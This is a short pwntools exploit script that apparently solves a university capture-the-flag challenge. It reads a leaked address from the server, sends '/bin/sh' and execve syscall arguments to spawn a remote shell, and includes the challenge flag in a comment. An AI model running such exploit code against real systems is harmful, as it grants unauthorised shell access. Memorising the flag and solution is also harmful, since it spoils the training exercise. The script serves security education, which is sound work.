from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10011
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+360
        b *main+365
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)

address = p.recvline().decode().split(' ')[-1]
print(f"Got address: {address}")
decoded_address = str(int(address, 16))
print(f'decoded address in decimal: {decoded_address}')


shellcode = b"/bin/sh"  # path to shell
arg0 = b'59'  # rax -> filled with execve's code (59)
arg1 = decoded_address  # rdi -> filled with pointer to path to shell itself
arg2 = b'0'  # rsi
arg3 = b'0'  # rdx
arg4 = b'0'  # r10
arg5 = b'0'  # r8
arg6 = b'0'  # r9
print(p.recv())
p.sendline(shellcode)

print(p.recv())
p.sendline(arg0)
p.sendline(arg1)
p.sendline(arg2)
p.sendline(arg3)
p.sendline(arg4)
p.sendline(arg5)
p.sendline(arg6)
print(p.recv())
p.interactive()  # to give commands after getting shell CSCE604258{warming-up-for-shellcode}
# pause()

